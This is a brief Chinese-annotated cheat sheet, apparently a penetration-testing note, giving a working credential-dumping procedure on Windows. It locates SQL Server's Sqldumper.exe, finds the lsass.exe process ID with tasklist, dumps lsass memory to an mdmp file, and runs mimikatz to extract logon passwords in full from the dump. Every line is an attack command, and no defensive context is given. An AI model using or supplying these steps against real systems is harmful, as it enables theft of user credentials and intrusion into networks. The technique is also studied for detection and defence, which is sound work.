	位置C:\Program Files\Microsoft SQL Server\number\Shared
	>tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号
	>Sqldumper.exe ProcessID PID 0x01100  导出mdmp文件
	>mimikatz.exe "sekurlsa::minidump SQLDmpr0001.mdmp" "sekurlsa::logonPasswords full" exit